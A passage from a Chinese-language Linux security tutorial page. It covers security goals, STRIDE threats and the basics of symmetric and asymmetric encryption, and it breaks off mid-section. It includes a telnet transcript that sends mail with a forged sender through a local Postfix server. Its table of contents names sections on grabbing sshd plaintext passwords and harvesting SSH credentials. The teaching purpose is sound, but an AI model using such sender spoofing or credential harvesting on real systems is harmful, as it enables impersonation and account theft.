<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Linux: 加密和安全</title>
<meta name="generator" content="Org Mode" />
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
<!-- from -->
<!--
<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
-->
<link rel="stylesheet" href="/static/aandds.com/css/main.css">
<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
<!--
<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>

<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
-->
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Linux: 加密和安全</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:73c362bc-d08c-4aa3-9786-af139b26b7c5">安全机制</a>
<ul>
<li><a href="#h:c215c675-f524-4ad2-8cec-8720d6f4b45d">墨菲定律</a></li>
<li><a href="#h:42389135-4e6b-442e-9840-ceb35fc613aa">信息安全防护的目标</a></li>
<li><a href="#h:078d1f5a-1b2f-47f2-bada-d0b9526c826f">安全防护环节</a></li>
<li><a href="#h:83cfa816-97b5-4dea-9e9c-12f22596af87">常见的安全攻击STRIDE</a></li>
<li><a href="#h:39ce5cd1-e734-47c9-b9db-5a9bf06d176f">安全设计基本原则</a></li>
<li><a href="#h:bfe66def-0096-4f8c-be79-6218b3e4cbec">常用安全技术</a></li>
<li><a href="#h:10bf68a9-b426-40a6-84ac-5d0bbdf0d92b">加密算法和协议</a>
<ul>
<li><a href="#h:b8c01f60-9db6-42ac-9a35-3949ce96ad0c">对称加密算法</a></li>
<li><a href="#h:271b83c4-4d0f-45f4-9061-dbc4fd310d94">非对称加密算法</a></li>
<li><a href="#h:e9c54822-16b9-45d4-89ec-4ae7d81b914a">使用gpg实现对称和非对称加密</a>
<ul>
<li><a href="#h:e029b916-581f-41ba-aabb-6d6b5f6b5008">主目录与配置文件</a></li>
<li><a href="#h:3e2bc31a-c23e-4f1b-9c16-e36730f4bbe7">实现公钥加密</a></li>
<li><a href="#h:7328a823-6fb7-4830-89d7-22b38d184511">使用公钥服务器</a></li>
<li><a href="#h:cc6db102-bb99-4d0c-a9ce-0a3db46dc8e7">实现加密与解密</a></li>
</ul>
</li>
<li><a href="#h:f633a61d-cdd2-49ba-bd9b-b844f0a89bfd">单向哈希算法</a></li>
<li><a href="#h:0e048834-04f1-4a53-8b08-0cd92f22bec1">综合应用多种加密算法</a></li>
<li><a href="#h:2a933844-09c2-4963-8ec3-d7522b0bde13">密码交换</a></li>
</ul>
</li>
<li><a href="#h:15736226-3317-4725-a36d-71ddb2ffcef9">CA和证书</a>
<ul>
<li><a href="#h:dc203430-a41c-49f6-8b1a-9aa92e1fdbc2">中间人攻击</a></li>
<li><a href="#h:fde4a67e-c078-4fc3-944c-ca54747208d2">CA和证书</a></li>
<li><a href="#h:96594e0c-d118-4cc5-9b7d-ee7f4d5ed5b5">安全协议 SSL/TLS</a>
<ul>
<li><a href="#h:9203a793-e629-4edd-a1cd-dc37ec5f6fb5">TLS 介绍</a></li>
<li><a href="#h:e4eec987-40c8-4eea-92b7-b8912a551498">SSL/TLS组成</a></li>
<li><a href="#h:03cc95e4-1936-4d0d-8d66-7e2ef6413dc3">TLS实现过程</a></li>
</ul>
</li>
<li><a href="#h:31552cf6-b86c-4841-9fd3-3660f1182db4">HTTPS</a>
<ul>
<li><a href="#h:2d83ae51-97be-4e21-bc10-f5571bb44b4d">HTTPS 结构</a></li>
<li><a href="#h:69652a05-d081-4988-8f97-1a43529185d6">HTTPS 工作的简化过程</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:0e76fc4e-ba1e-4081-8df2-94a5abd91d58">OpenSSL</a>
<ul>
<li><a href="#h:df204897-b626-4bd1-9940-64472aabbb87">OpenSSL 介绍</a></li>
<li><a href="#h:04e33401-8c1f-45f5-9834-03456ff614d7">OpenSSL 更新</a></li>
<li><a href="#h:1836c300-93e0-43b4-9b8c-b1e10ae7dfea">Base64 编码</a></li>
<li><a href="#h:3b241698-22c6-4115-adbc-a50c3539f56f">openssl命令</a>
<ul>
<li><a href="#h:3e665d25-6fe6-41dc-83c0-ee01e6ea9057">openssl enc命令对称加密</a></li>
<li><a href="#h:b41c6355-52eb-41cb-8b14-5afe58eeb74d">openssl dgst命令单向哈希加密</a></li>
<li><a href="#h:503e5e02-04d0-4af5-bb69-eb1b1cb1c672">openssl passwd命令生成用户密码</a></li>
<li><a href="#h:c0dbf2d7-2749-41fa-a9e3-deb0869678cc">openssl rand 命令生成随机数</a></li>
<li><a href="#h:b16f1720-42ef-457e-9bd6-17158ad42141">openssl命令实现PKI</a></li>
</ul>
</li>
<li><a href="#h:876640bb-30e8-4bc7-88ce-5d01b7ad4f3d">建立私有CA实现证书申请颁发</a>
<ul>
<li><a href="#h:5afd8955-d92c-442d-93a4-280eea1dc06f">openssl的配置文件</a>
<ul>
<li><a href="#h:95b932a5-524e-4eeb-8caa-ce61fadc0c54">语法</a></li>
<li><a href="#h:c74bffea-288b-4e0a-a420-d80b1b3104a5">默认字段</a></li>
<li><a href="#h:6f456734-9c11-43af-9c83-9f167d7f6af3">证书请求配置</a></li>
<li><a href="#h:44d31e3e-6fe0-4505-956c-01b9f6bcad22">扩展部分</a></li>
<li><a href="#h:aa4da6ad-b2dc-42c1-9836-43692c37b977">证书签发配置</a></li>
</ul>
</li>
<li><a href="#h:103203b1-11a4-4bac-97ee-d2cedc94f04e">创建私有CA（自签名证书）</a>
<ul>
<li><a href="#h:229d84ff-9e5a-49ac-a35d-319dbd1ff220">openssl req (生成证书请求和自建CA)</a></li>
</ul>
</li>
<li><a href="#h:6ca0f19f-5446-4bae-be61-92404b88c2c9">申请证书并颁发证书</a>
<ul>
<li><a href="#h:74428868-4e7d-4c09-a49a-5934cbb63fbb">openssl ca (签署和自建CA)</a></li>
<li><a href="#h:84fb81f5-8a5b-4f6b-a011-ddfb7580986e">openssl x509(签署和自签署)</a></li>
</ul>
</li>
<li><a href="#h:8f2a9e0a-b099-4982-ae13-5b37252a0563">吊销证书</a></li>
<li><a href="#h:796dbef0-8db6-46e4-80e9-9b1b54c03d7c">CentOS 7 创建自签名证书</a></li>
<li><a href="#h:e588d3b4-e6aa-4f1c-868b-04cc28a348c1">实战案例</a>
<ul>
<li><a href="#h:825e4f0e-0e90-4a07-acfa-e1f57540a402"><b>创建CA相关目录和文件</b></a></li>
<li><a href="#h:9b28f64c-a4b6-40ca-bc87-327dec6d143f"><b>创建CA的私钥</b></a></li>
<li><a href="#h:bd2e18ea-2e5d-45d0-9eb4-310c42b0e60c"><b>给CA颁发自签名证书</b></a></li>
<li><a href="#h:a0b8e047-7f8d-43da-be67-92ddbadac8db"><b>用户生成私钥和证书申请</b></a></li>
<li><a href="#h:a9cc6782-136b-43b5-97d1-c338eb973a38"><b>CA颁发证书</b></a></li>
<li><a href="#h:0f1e74c3-0124-4c1c-8a80-15681c21954d">查看证书</a></li>
<li><a href="#h:7932de15-d0cc-4f05-acc9-63eefc5baa09">将证书相关文件发送到用户端使用</a></li>
<li><a href="#h:d87e121b-ef1a-40a6-8ca5-9d27caec0df0">证书的信任</a></li>
<li><a href="#h:87004d56-73bd-49f6-bede-a23f5f6eb6ff">证书的吊销</a></li>
<li><a href="#h:29d5c52c-4f5a-4b7a-87fa-3a322fed2019"><b>生成证书吊销列表文件</b></a></li>
<li><a href="#h:630ba5dc-caff-4ff4-9152-bebce1311be3">各种服务开启SSL</a></li>
<li><a href="#h:64542161-6d5c-4b5b-b904-d85a55df6633">HTTPS双向认证的负载均衡服务</a></li>
</ul>
</li>
<li><a href="#h:5062dade-b835-49e4-8e58-8d16231fd4cd">证书性能</a></li>
<li><a href="#h:7346fd8c-09cd-4225-99e1-2795136fe203">证书转换</a>
<ul>
<li><a href="#h:44fc5963-96bc-44a9-b569-81d540c66841">PFX(PKCS12)格式和JKS格式证书</a></li>
<li><a href="#h:6f2981c0-05d9-4aaf-b9e3-1013733dd376">PEM格式与PFX格式证书</a></li>
<li><a href="#h:97127463-fbd1-4e8a-a7ec-9785bcdb79ff">PEM格式与DER格式证书</a></li>
<li><a href="#h:772da5e1-28e4-4751-944a-637fd6611006">PEM格式与P7B格式证书</a></li>
<li><a href="#h:92bf3c49-f515-46cd-a42c-4773cc7c6b5a">CER格式与BKS格式证书</a></li>
<li><a href="#h:5e521c5b-fe21-4952-b6fa-500d7639d885">PFX格式与BKS格式证书</a></li>
<li><a href="#h:294e2170-40ec-4cdf-8185-090e0ac9fb5d">BKS格式转BKS-v1格式证书</a></li>
<li><a href="#h:0dcfc9b8-85f7-4e1d-a112-1750558be83f">PKCS1格式与PKCS8格式证书</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:902b833c-3f4e-4161-b3fa-3f93c19cf486">可信任免费泛域名证书Let's Encrypt</a>
<ul>
<li><a href="#h:605d5981-de46-4c54-96ef-2901ac1c0388">安装客户端acme.sh</a></li>
<li><a href="#h:c979a0e9-8b23-49d5-bcfd-1c156fc9d407">简单使用</a></li>
<li><a href="#h:879e5130-9967-4edd-a1b4-7b7432f5ec17">申请证书-dns方式</a></li>
<li><a href="#h:cf1ef02a-ee11-4778-aad5-16076a8f1cc1">追加域名</a></li>
<li><a href="#h:0f904190-1897-40ba-a1f1-c9c7dda8b862">续费所有证书</a></li>
<li><a href="#h:40801e62-b77c-4de5-940c-101f8a15014b">测试nginx的公网地址</a></li>
</ul>
</li>
<li><a href="#h:a53471ea-65eb-40da-a724-687cca688a23">certutil</a></li>
<li><a href="#h:e712b1fa-59f7-40fc-a6e8-630584f5fb0d">cfssl</a></li>
<li><a href="#h:bc82687b-b843-4c01-aaa8-43eb50e3d456">开源证书管理平台</a></li>
</ul>
</li>
<li><a href="#h:9cf245cd-11fa-4f87-8223-533d695354e0">ssh服务</a>
<ul>
<li><a href="#h:fd47a345-6746-4b7c-95ea-900580604fc1">ssh服务介绍</a>
<ul>
<li><a href="#h:f98dceb2-4a2a-41a8-af68-ac8d8a603895">公钥交换原理</a>
<ul>
<li><a href="#h:167b8ec4-9ecc-486b-a809-470121524e83">指纹信息</a></li>
</ul>
</li>
<li><a href="#h:0511cf72-d86c-46ff-8ffa-01844e986fde">ssh加密通讯原理</a></li>
</ul>
</li>
<li><a href="#h:0ba58e6e-419d-4c69-894d-3e5fc7d199e0">openssh软件包</a></li>
<li><a href="#h:08f9ad34-b697-4810-b73c-8dfd56bbc54f">ssh客户端命令</a>
<ul>
<li><a href="#h:6dec53d1-f831-41bc-9a1d-b8aa04ea4f10">ssh登录验证方式介绍</a></li>
<li><a href="#h:14fc5b89-6475-46f7-84d7-6ad0b98d8fde">实现基于密钥的登录方式</a>
<ul>
<li><a href="#h:58629ba6-9895-4843-abd3-33aad15bb440">通过私钥生成公钥</a></li>
<li><a href="#h:788f740e-0dc2-4cde-9ec6-2270d9c8006d">私钥格式转换</a></li>
</ul>
</li>
<li><a href="#h:a7f543d6-c63b-48dd-9ed0-55b84c8c30a4">其它ssh客户端工具</a>
<ul>
<li><a href="#h:1cb8698c-5a45-4dc1-8368-a115aee1e43d">scp命令</a></li>
<li><a href="#h:1bca94c7-051f-4689-9dfa-5e4c271ff3ef">sftp命令</a></li>
<li><a href="#h:7679b67b-fa0f-4384-a700-5c692c81ee24">rsync 命令</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:dddf8665-1569-4ee2-9eaa-e62e0b0bfafc"><code>ssh_config</code>&#x2013;OpenSSH 客户端配置文件</a></li>
<li><a href="#h:0fa288e0-06bf-42ec-8d52-1b0c65cb65f6"><code>sshd_config</code>&#x2013;OpenSSH 服务端配置文件</a>
<ul>
<li><a href="#h:4b32adbb-31e6-406d-88de-e4a71d0dd750">常用配置</a></li>
</ul>
</li>
<li><a href="#h:281c4921-bf6b-413c-b8b5-118c111c7a0c">ssh高级应用</a>
<ul>
<li><a href="#h:d4e86230-854a-45ec-9fa9-cf51d2b64a75">SSH本地端口转（特定场合会用到）</a>
<ul>
<li><a href="#h:7f3ee002-4f6c-4a8e-9793-c8bdbc77c2d4">级联及代理工具</a></li>
<li><a href="#h:5b735cbf-9f07-42cd-9c54-4700aea3ef10">创建到目标主机的持久化连接</a></li>
<li><a href="#h:d48282ff-0d30-4c75-909c-fa27294d2e7a">代理工具 sshuttle</a></li>
</ul>
</li>
<li><a href="#h:c154af0a-bb85-4fd2-b684-dbe405a57c4a">SSH远程端口转发</a></li>
<li><a href="#h:d713d82f-4ef6-4b8b-b584-cd8b06c9129f">SSH动态端口转发</a></li>
<li><a href="#h:afb334f1-abe9-4ac0-b289-5dbaf0b73c20">X 协议转发</a></li>
<li><a href="#h:1894b25a-dcfa-4f71-9b01-03edac9fd6c4">跳转主机</a></li>
<li><a href="#h:875d51c9-a23f-4008-9a17-702c40f52727">其它端口转发方式</a>
<ul>
<li><a href="#h:2b70d2fb-0e98-4849-b36c-806cb5bab627">iptables 端口转发</a></li>
<li><a href="#h:14ab6394-e714-4473-868b-0db442c4f14c">firewall 端口转发</a></li>
<li><a href="#h:40a2a1aa-0330-433b-90f3-0bd2e1d449bf">rinetd 本地端口转发</a></li>
<li><a href="#h:ef37d881-1781-4b6c-9ba4-db3fb97fde36">ncat 端口转发</a></li>
<li><a href="#h:f5196f94-1176-47e5-8c0a-114b09037702">socat 端口转发</a></li>
<li><a href="#h:45b9a434-1f6c-45b4-80cc-cf2cb7bcd179">portmap 端口转发</a></li>
</ul>
</li>
<li><a href="#h:a41562f1-ecd1-444b-9c6f-d3f1eface63e">安全相关</a>
<ul>
<li><a href="#h:4f3eebbc-de7d-405b-b7fa-25361de4ae24">获取sshd进程明文密码</a></li>
<li><a href="#h:03216cd2-b729-4184-aaec-d8f29e18e90b">收集ssh登陆凭证</a></li>
<li><a href="#h:7527fed6-a842-4e88-902e-40e0c437a967">访问控制</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:727b8330-29ea-4dc3-b522-5c07ae7ae7fe">ssh 其它相关工具</a>
<ul>
<li><a href="#h:9b87c33d-f867-4447-b666-5c754c3c33e7">挂载远程ssh目录 sshfs</a></li>
<li><a href="#h:e86558cb-355c-4083-897b-c76a12395425">自动登录ssh工具sshpass</a></li>
<li><a href="#h:7aa7d43e-5ec6-40e8-bad3-e2a1f543381c">轻量级自动化运维工具 pssh</a></li>
</ul>
</li>
<li><a href="#h:786a44d7-2098-46cd-9d77-d27aada7a4bd">dropbear</a></li>
</ul>
</li>
<li><a href="#h:e2208d28-365d-49ba-9280-9379f7a6d6e5">利用sudo实现授权</a>
<ul>
<li><a href="#h:8e1185a9-bb2a-4c10-ab17-9b5ace31feaa">sudo 介绍</a></li>
<li><a href="#h:cf355ec2-7eef-40f4-9a00-4f813ed3ed34">sudo 组成</a></li>
<li><a href="#h:87da6daf-cca5-47c9-b4e4-761b26cd02c3">sudo 命令</a></li>
<li><a href="#h:778f69a5-53c2-422c-955b-7c785d22bbf7">sudo 授权规则配置</a></li>
<li><a href="#h:8537b992-fe9a-418d-8c99-16873122a00a">实战案例</a></li>
</ul>
</li>
<li><a href="#h:ec458b62-5791-4220-abf6-e61f915ce171">PAM认证机制</a>
<ul>
<li><a href="#h:8e43a5df-c95b-48af-a985-e69be9aafe41">PAM 介绍</a></li>
<li><a href="#h:93f38dac-54bc-45da-a170-57c83886be27">PAM架构</a></li>
<li><a href="#h:a43e0457-b20b-47be-a40b-71ec8e8a9684">PAM相关文件</a></li>
<li><a href="#h:82b1ea8a-b3dd-4440-942f-73259817e45c">PAM工作原理</a></li>
<li><a href="#h:af890347-5dcd-48f8-8376-8fe72690a9ea">PAM 配置文件格式说明</a></li>
<li><a href="#h:2e34cfca-c49a-413e-9744-fc7234735926">PAM模块帮助</a></li>
<li><a href="#h:ea670f28-c7a7-4621-8b05-1b058c35b672">常用PAM模块</a>
<ul>
<li><a href="#h:9fc0359a-1d60-46a2-b335-3c0df2619d34"><code>pam_shells</code> 模块</a></li>
<li><a href="#h:8db42eec-a319-41bc-be2d-3dccbd62337f"><code>pam_securetty.so</code> 模块</a></li>
<li><a href="#h:8ad8c396-efaf-4b36-86a9-6f406a8c9685"><code>pam_nologin.so</code> 模块</a></li>
<li><a href="#h:f21d7f5a-9400-4ede-b15f-10f3311ca447"><code>pam_limits.so</code> 模块</a></li>
<li><a href="#h:11bfdac4-0863-4209-8a31-f18f796e638b"><code>pam_succeed_if</code> 模块</a></li>
<li><a href="#h:6e40e5e6-d416-4054-b270-9d0027461808"><code>pam_google_authenticator</code> 模块</a></li>
<li><a href="#h:6e042263-7e8d-4345-8eb2-501011ff70f3"><code>pam_access.so</code> 模块</a></li>
<li><a href="#h:355cc79f-4a79-4d54-88df-645d9abec8bc"><code>pam_time.so</code> 模块</a></li>
<li><a href="#h:dc3c7b86-8eb9-455f-9b4a-d1d0d64a1383"><code>pam_listfile.so</code> 模块</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#h:ffcd3712-174d-478a-b7c7-aa2b7f88387a">TCP Warpper</a>
<ul>
<li><a href="#h:2fd1d7dc-f664-45ae-a000-ae24300f14fa">TCP_Wrappers介绍</a></li>
<li><a href="#h:ba4593f2-ca02-4f4d-a9a3-879665648e57">TCP_Wrappers的使用</a></li>
<li><a href="#h:d84c151f-752e-487e-ba8d-c5f091364f97">测试工具tcpdmatch</a></li>
</ul>
</li>
<li><a href="#h:d4fcca2d-a9de-437b-a5cd-cd552a7b2793">SELinux</a>
<ul>
<li><a href="#h:8f53e9d4-edde-471f-b543-55c951cff3c2">SELinux 介绍和工作原理</a>
<ul>
<li><a href="#h:f7019f75-5fae-4ffb-87cb-dbb30bf592f9">SELinux 介绍</a></li>
<li><a href="#h:80e6d452-2506-4a9a-9526-011d94eda739">SELinux 相关概念</a></li>
<li><a href="#h:e2810fad-0be7-4cb2-84a3-81cf4bd08918">SELinux有四种工作类型</a></li>
<li><a href="#h:392d65ae-9b65-4176-b464-7d3dbb250970">SELinux安全上下文</a></li>
</ul>
</li>
<li><a href="#h:113a940c-974a-4a6a-8937-fcbc045a6b10">启用和禁用SELinux</a></li>
<li><a href="#h:25ccd806-c8f7-4579-8b30-01dca5c67b88">管理文件安全标签</a></li>
<li><a href="#h:11c3cf38-e659-41c9-bc58-676ba15b301b">管理端口标签</a></li>
<li><a href="#h:51419588-06cf-480c-9058-125556748803">管理SELinux布尔值开关</a></li>
<li><a href="#h:081ea980-84c3-4f1a-bba1-ad184bd181c4">管理日志</a></li>
<li><a href="#h:26b4d548-1289-4ace-95a3-23ec93708dd9">查看SELinux帮助</a></li>
</ul>
</li>
<li><a href="#h:7e1217eb-240d-43dd-94e2-7d224bec7231">文件完整性检查AIDE(dvanced Intrusion Detection Environment)</a></li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../index.html">Linux</a></li>
</ul>


<p>
内容概述
</p>

<ul class="org-ul">
<li>安全机制</li>
<li>对称和非对称加密</li>
<li>散列算法</li>
<li>PKI和CA</li>
<li>openssl</li>
<li>证书管理</li>
<li>ssh服务和dropbear</li>
<li>轻量级自动化运维工具</li>
<li>完整性验证aide</li>
<li>权限授权管理Sudo</li>
<li>PAM模块</li>
<li>TCP Wrappers</li>
<li>SELinux安全加强</li>
</ul>
<section id="outline-container-h:73c362bc-d08c-4aa3-9786-af139b26b7c5" class="outline-2">
<h2 id="h:73c362bc-d08c-4aa3-9786-af139b26b7c5">安全机制</h2>
<div class="outline-text-2" id="text-h:73c362bc-d08c-4aa3-9786-af139b26b7c5">
</div>
<div id="outline-container-h:c215c675-f524-4ad2-8cec-8720d6f4b45d" class="outline-3">
<h3 id="h:c215c675-f524-4ad2-8cec-8720d6f4b45d">墨菲定律</h3>
<div class="outline-text-3" id="text-h:c215c675-f524-4ad2-8cec-8720d6f4b45d">
<p>
墨菲定律：一种心理学效应，是由爱德华·墨菲（Edward A.  Murphy）提出的，
原话：如果有两种或两种以上的方式去做某件事情，而其中一种选择方式将导致
灾难，则必定有人会做出这种选择
</p>

<p>
<b>主要内容：</b>
</p>

<ul class="org-ul">
<li>任何事都没有表面看起来那么简单</li>
<li>所有的事都会比你预计的时间长</li>
<li>会出错的事总会出错</li>
<li>如果你担心某种情况发生，那么它就更有可能发生</li>
</ul>
</div>
</div>
<div id="outline-container-h:42389135-4e6b-442e-9840-ceb35fc613aa" class="outline-3">
<h3 id="h:42389135-4e6b-442e-9840-ceb35fc613aa">信息安全防护的目标</h3>
<div class="outline-text-3" id="text-h:42389135-4e6b-442e-9840-ceb35fc613aa">
<ul class="org-ul">
<li>保密性 Confidentiality 确保通信信息不被任何无关的人看到；</li>
<li>完整性 Integrity 实现通信双方的报文不会产生信息丢失；数据完整性;系统
完整性</li>
<li>可用性 Usability 通信任何一方产生的信息应当对授权实体可用；</li>
<li>可控制性 Controlability</li>
<li>不可否认性 Non-repudiation</li>
</ul>
</div>
</div>
<div id="outline-container-h:078d1f5a-1b2f-47f2-bada-d0b9526c826f" class="outline-3">
<h3 id="h:078d1f5a-1b2f-47f2-bada-d0b9526c826f">安全防护环节</h3>
<div class="outline-text-3" id="text-h:078d1f5a-1b2f-47f2-bada-d0b9526c826f">
<ul class="org-ul">
<li>物理安全：各种设备/主机、机房环境</li>
<li>系统安全：主机或设备的操作系统</li>
<li>应用安全：各种网络服务、应用程序</li>
<li>网络安全：对网络访问的控制、防火墙规则</li>
<li>数据安全：信息的备份与恢复、加密解密</li>
<li>管理安全：各种保障性的规范、流程、方法</li>
</ul>
</div>
</div>
<div id="outline-container-h:83cfa816-97b5-4dea-9e9c-12f22596af87" class="outline-3">
<h3 id="h:83cfa816-97b5-4dea-9e9c-12f22596af87">常见的安全攻击STRIDE</h3>
<div class="outline-text-3" id="text-h:83cfa816-97b5-4dea-9e9c-12f22596af87">
<ul class="org-ul">
<li>Spoofing 假冒</li>
<li>Tampering 篡改</li>
<li>Repudiation 否认 如 ARP欺骗</li>
<li>Information Disclosure 信息泄漏</li>
<li>Denial of Service 拒绝服务</li>
<li>Elevation of Privilege 提升权限</li>
</ul>

<p>
范例：冒充
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">telnet 127.0.0.1 25</span>
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span style="color: #8b2252;">'^]'</span>.
220 centos7.localdomain ESMTP Postfix
hello a.com
502 5.5.2 Error: command not recognized
mail from: mayun@alibaba.comm
250 2.1.0 Ok
rcpt to: wang
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
subject: I am mayun
<span style="color: #483d8b;">.</span>
250 2.0.0 Ok: queued as 2E1E91C87F725
quit
221 2.0.0 Bye
Connection closed by foreign host.
</pre>
</div>
</div>
</div>
<div id="outline-container-h:39ce5cd1-e734-47c9-b9db-5a9bf06d176f" class="outline-3">
<h3 id="h:39ce5cd1-e734-47c9-b9db-5a9bf06d176f">安全设计基本原则</h3>
<div class="outline-text-3" id="text-h:39ce5cd1-e734-47c9-b9db-5a9bf06d176f">
<ul class="org-ul">
<li>使用成熟的安全系统</li>
<li>以小人之心度输入数据 如SQL注入</li>
<li>外部系统是不安全的</li>
<li>最小授权</li>
<li>减少外部接口</li>
<li>缺省使用安全模式</li>
<li>安全不是似是而非</li>
<li>从STRIDE思考</li>
<li>在入口处检查</li>
<li>从管理上保护好你的系统</li>
</ul>
</div>
</div>
<div id="outline-container-h:bfe66def-0096-4f8c-be79-6218b3e4cbec" class="outline-3">
<h3 id="h:bfe66def-0096-4f8c-be79-6218b3e4cbec">常用安全技术</h3>
<div class="outline-text-3" id="text-h:bfe66def-0096-4f8c-be79-6218b3e4cbec">
<ul class="org-ul">
<li>认证</li>
<li>授权</li>
<li>审计</li>
<li>安全通信</li>
</ul>
</div>
</div>
<div id="outline-container-h:10bf68a9-b426-40a6-84ac-5d0bbdf0d92b" class="outline-3">
<h3 id="h:10bf68a9-b426-40a6-84ac-5d0bbdf0d92b">加密算法和协议</h3>
<div class="outline-text-3" id="text-h:10bf68a9-b426-40a6-84ac-5d0bbdf0d92b">
<ul class="org-ul">
<li>对称加密</li>
<li>非对称（公钥）加密</li>
<li>单向加密</li>
<li>认证协议</li>
</ul>
</div>
<div id="outline-container-h:b8c01f60-9db6-42ac-9a35-3949ce96ad0c" class="outline-4">
<h4 id="h:b8c01f60-9db6-42ac-9a35-3949ce96ad0c">对称加密算法</h4>
<div class="outline-text-4" id="text-h:b8c01f60-9db6-42ac-9a35-3949ce96ad0c">

<figure id="org639d49e">
<img src="images/image-20210120153703478.png" alt="image-20210120153703478.png" width="50%">

</figure>

<p>
对称加密：加密和解密使用同一个密钥
</p>

<p>
特性：
</p>

<ul class="org-ul">
<li>加密、解密使用同一个密钥，效率高</li>
<li>将原始数据分割成固定大小的块，逐个进行加密</li>
</ul>

<p>
缺陷：
</p>

<ul class="org-ul">
<li>密钥过多</li>
<li>密钥分发</li>
<li>数据来源无法确认</li>
</ul>

<p>
常见对称加密算法:
</p>

<ul class="org-ul">
<li><p>
DES：Data Encryption Standard即数据加密标准，56bits
</p>

<p>
1976年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。
</p>

<p>
算法的入口参数有三个:Key、Data、Mode。
</p>

<p>
Key为7个字节共56位,是DES算法的工作密钥;
Data为8个字节64位,是要被加密或被解密的数据;
Mode为DES的工作方式,有两种:加密或解密
</p></li>

<li>3DES：Triple DES : DES的增强版，比DES多3个数量级</li>

<li><p>
AES：Advanced Data Encryption Standard高级加密标准 (128, 192, 256bits)
</p>

<p>
3DES虽然现在是安全的，但随着计算机硬件的更新，总有一天要被攻破；AES
算法欲取待3DES算法，他支持128，192和256位密钥长度，有效的密钥长度可
达上千位。更重要的是，AES算法采用了更为高效的编写方法，对CPU的占用率
较少；目前广泛使用。
</p></li>

<li>商业版：Blowfish，twofish，IDEA，RC6，CAST5等等&#x2026;</li>
</ul>


<figure id="org3b2d4dd">
<img src="images/image-20210302073004893.png" alt="image-20210302073004893.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:271b83c4-4d0f-45f4-9061-dbc4fd310d94" class="outline-4">
<h4 id="h:271b83c4-4d0f-45f4-9061-dbc4fd310d94">非对称加密算法</h4>
<div class="outline-text-4" id="text-h:271b83c4-4d0f-45f4-9061-dbc4fd310d94">
<p>
<b>非对称加密算法介绍</b>
</p>

<p>
非对称加密：密钥是成对出现
</p>

<ul class="org-ul">
<li>公钥：public key，公开给所有人，主要给别人加密使用</li>
<li>私钥：secret key，private key自己留存，必须保证其私密性，用于自已加
密签名</li>
<li>特点：用公钥加密数据，只能使用与之配对的私钥解密；反之亦然</li>
</ul>

<p>
功能：
</p>

<ul class="org-ul">
<li>数据加密：适合加密较小数据,比如: 加密对称密钥</li>
<li>数字签名：主要在于让接收方确认发送方身份</li>
</ul>

<p>
缺点：
</p>

<ul class="org-ul">
<li>密钥长,算法复杂</li>
<li>加密解密效率低下</li>
</ul>

<p>
常见算法：
</p>

<ul class="org-ul">
<li>RSA：由 RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文
件块的长度也是可变的,可实现加密和数字签名</li>

<li>DSA（Digital Signature Algorithm）：数字签名算法，是一种标准的
DSS（数字签名标准）</li>

<li>ECC（Elliptic Curves Cryptography）：椭圆曲线密码编码学，比RSA加密算
法使用更小的密钥，提供相当的或更高等级的安全</li>
</ul>

<p>
就算法本身的实现来讲，公钥加密技术比对称加密技术的速度慢上差不多3个数
量级，一个数量级就是10倍，所以3个数量级不是30倍，而是1000倍。因此，在
加密数据时是很少用到公钥去加密的
</p>

<p>
<b>非对称加密实现加密</b>
</p>


<figure id="orgade92d6">
<img src="images/image-20210120153751008.png" alt="image-20210120153751008.png" width="50%">

</figure>

<p>
接收者
</p>

<ul class="org-ul">
<li>生成公钥/密钥对：P和S</li>
<li>公开公钥P，保密密钥S</li>
</ul>

<p>
发送者
</p>

<ul class="org-ul">
<li>使用接收者的公钥来加密消息M</li>
<li>将P(M)发送给接收者</li>
</ul>

<p>
接收者
</p>

<ul class="org-ul">
<li>使用密钥S来解密：M=S(P(M))</li>
</ul>

<p>
<b>非对称加密实现数字签名</b>
</p>


<figure id="org1048f9b">
<img src="images/image-20210120153809695.png" alt="image-20210120153809695.png" width="50%">

</figure>

<p>
发送者
</p>

<ul class="org-ul">
<li>生成公钥/密钥对：P和S</li>
